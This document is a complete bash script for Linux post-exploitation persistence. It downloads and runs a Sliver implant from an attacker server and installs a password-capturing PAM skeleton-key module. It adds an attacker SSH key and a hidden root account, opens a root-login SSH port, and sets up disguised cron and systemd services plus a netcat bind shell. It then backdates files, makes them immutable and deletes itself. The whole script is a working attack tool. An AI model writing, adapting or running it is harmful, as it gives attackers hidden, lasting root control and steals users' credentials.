#!/bin/bash

set +e

# Disable root history
set +o history
export HISTFILE=/dev/null

if [ $# -lt 3 ]
    then
        echo "Usage: ./linux_persistence.sh {ip}:{port} {sliver_payload_file} {pam_so_file}"
        echo "Example: ./lp.sh 192.168.x.x:1338 lin_wg_imp pam_login.so"
        exit 1
fi

SERVER="$1"
SLIVER_PAYLOAD_NAME="$2"
PAM_SO_NAME="$3"
RANDOM_ETC_DIR="xdrs"
RANDOM_BINARY_NAME="authenticate"


SLIVER_PAYLOAD_PATH="/etc/$RANDOM_ETC_DIR/$RANDOM_BINARY_NAME"
PAM_SO_PATH="/etc/pam.d/pam_login.so"
PAM_PASSWORD_STORE="/etc/pam_out"


# Pull and run sliver payload
mkdir -p "/etc/$RANDOM_ETC_DIR/"
wget "http://$SERVER/$SLIVER_PAYLOAD_NAME" -O "$SLIVER_PAYLOAD_PATH" >/dev/null 2>&1
chmod +x "$SLIVER_PAYLOAD_PATH" 2>/dev/null
touch -d "Mar 16 2018" "$SLIVER_PAYLOAD_PATH"
touch -d "Oct 19 2018" "/etc/$RANDOM_ETC_DIR/"
chattr +i "$SLIVER_PAYLOAD_PATH" 2>/dev/null
"$SLIVER_PAYLOAD_PATH" >/dev/null 2>&1 &


# Deploy the PAM module and set up password store
wget "http://$SERVER/$PAM_SO_NAME" -O "$PAM_SO_PATH" >/dev/null 2>&1
chmod 644 "$PAM_SO_PATH"
touch -d "Mar 15 2018" "$PAM_SO_PATH"
touch -d "Mar 15 2018" "/etc/pam.d/"
chattr +i "$PAM_SO_PATH"

touch -d "Aug 2 2014" "$PAM_PASSWORD_STORE"
chmod 777 "$PAM_PASSWORD_STORE"

# Write SSH key to /root/.ssh/authorized_keys
mkdir -p /root/.ssh
chmod 700 /root/.ssh
cat <<EOF >> /root/.ssh/authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCGRUNfbpXZd+T+or29xoDWIeCTzuvYMdT4YSoD3G8U/8MyiqpW/KDr3qp+Ft3jeI+Ke33oTBaYCKzuKeU6Mkvr4QEHmlrNXlMsIMQ/PDyM1/L83ymFRYxa1C5mBNW3CJ7MwmfV2wYCX8btnv8Nt9qaCviBYABB7JXH7aZxZKDuT99oYbct2uaEu6h5e2gdd/qbIqZf3ceOxJ13ssAxWuTD6yRnIVzZxbyCtj61uH1ypvBiJRSkGoI1naq6IOivsnfadYyPXF4jvPgr+c7rcjK3AOPVy8EmQzW5rMJX3yyOvXyLZCfPsA/Rax9AwEltW+8ZY1QZQ3UUdb9/UDQR7N6Koe30rwV9hF50aB5/6KaukLD47Xik7nXv6tD396tXR+5UIJjTAxYisYbhfyz8SpryEe5WSGqcRaHsw836WH6I9fLoVHyAPFNYB717xcdlUF2zRixNamdPljM4namiFb4BA94b/KjFO/f7v+PFCc8xk/1vbFNilGx5dcK6pdwzuMx5ZOXXxpbiVoMByHAaUDjQIPGUM6galG/z2hdmYLDkLp4QPyj4XjFAYOrfgOdbjace+jKyMlI/Ped4noyA7sOeIeSIWLSDioCRXNg/a1pYluz2Ypdqa9+bmv4Q+VNhhuJibUrzqkV5v2ycn8w2AmrFeB32suJD4RTe2NHpj9JySQ== kali@kali
EOF
chmod 600 /root/.ssh/authorized_keys
touch -d "Dec 14 2018" /root/.ssh/
touch -d "Dec 14 2018" /root/.ssh/authorized_keys
chattr +i /root/.ssh/authorized_keys 2>/dev/null

# Root shell + SSH persistence with port variance (docker/w00t)
echo 'docker:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash' >> /etc/passwd 2>/dev/null
touch -d "Jun 15 2018" /etc/passwd
chattr +i /etc/passwd 2>/dev/null
# Add high port and permit root login
sed -i 's/^#Port 22/Port 22\nPort 29472/' /etc/ssh/sshd_config 2>/dev/null
echo 'Port 29472' >> /etc/ssh/sshd_config 2>/dev/null
echo 'PermitRootLogin yes' >> /etc/ssh/sshd_config 2>/dev/null
touch -d "Jul 1 2018" /etc/ssh/sshd_config
chattr +i /etc/ssh/sshd_config 2>/dev/null

# Create backup SSH config in sshd_config.d
mkdir -p /etc/ssh/sshd_config.d/
cat <<EOF > /etc/ssh/sshd_config.d/ssh-bak.conf
Port 29472
PermitRootLogin yes
EOF
chmod 644 /etc/ssh/sshd_config.d/ssh-bak.conf
touch -d "Feb 11 2018" /etc/ssh/sshd_config.d/ssh-bak.conf
chattr +i /etc/ssh/sshd_config.d/ssh-bak.conf 2>/dev/null

# Restart SSH to apply changes
service ssh restart >/dev/null 2>&1 || systemctl restart sshd >/dev/null 2>&1

# Cron persistence
cat <<EOF > /etc/cron.d/mdb
* * * * * root pgrep -x $RANDOM_BINARY_NAME >/dev/null || $SLIVER_PAYLOAD_PATH >/dev/null 2>&1
EOF
chmod 644 /etc/cron.d/mdb
touch -d "12 Jul 2020" /etc/cron.d/mdb
chattr +i /etc/cron.d/mdb 2>/dev/null

# Service-based persistence
cat <<EOF > /lib/systemd/system/gpu.service
[Unit]
Description=GPU System Service
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c 'pgrep -x '"$RANDOM_BINARY_NAME"' >/dev/null || '"$SLIVER_PAYLOAD_PATH"
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target
EOF

chmod 644 /lib/systemd/system/gpu.service
touch -d "Mar 15 2018" /lib/systemd/system/gpu.service
chattr +i /lib/systemd/system/gpu.service 2>/dev/null
systemctl daemon-reload >/dev/null 2>&1
systemctl enable gpu.service >/dev/null 2>&1
systemctl start gpu.service >/dev/null 2>&1

# PAM Skeleton Key 
PAM_FILE="/etc/pam.d/common-auth"

# Inject PAM module if not already present
if ! grep -qF "$PAM_SO_PATH" "$PAM_FILE"; then
    awk -v newline="auth    sufficient                      $PAM_SO_PATH" '
        NF > 0 && $1 !~ /^#/ && !done {
            print newline;
            $0 = $0 " use_first_pass";
            done = 1;
        }
        { print }
    ' "$PAM_FILE" > /tmp/.pam_temp && mv /tmp/.pam_temp "$PAM_FILE"
fi


# Add bind shell with auto-restart functionality
for PORT in 4040; do
    # Create an individual service file for each bind shell
    cat <<EOF > /lib/systemd/system/servlist.service
[Unit]
Description=System Monitoring Service ($PORT)
After=network.target

[Service]
Type=simple
ExecStart=/bin/sh -c "while true; do busybox nc -l -p $PORT -e /bin/bash; sleep 1; done"
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
EOF
    chmod 644 /lib/systemd/system/servlist.service
    touch -d "Mar 30 2018" /lib/systemd/system/servlist.service
    chattr +i /lib/systemd/system/servlist.service 2>/dev/null
    
    # Enable and start the service
    systemctl daemon-reload >/dev/null 2>&1
    systemctl enable servlist.service >/dev/null 2>&1
    systemctl start servlist.service >/dev/null 2>&1
    
    # Also start a detached screen session as a backup method
    screen -dmS monitor /bin/sh -c "while true; do busybox nc -l -p $PORT -e /bin/bash; sleep 1; done" >/dev/null 2>&1
done


# delete script
rm -- "$0"
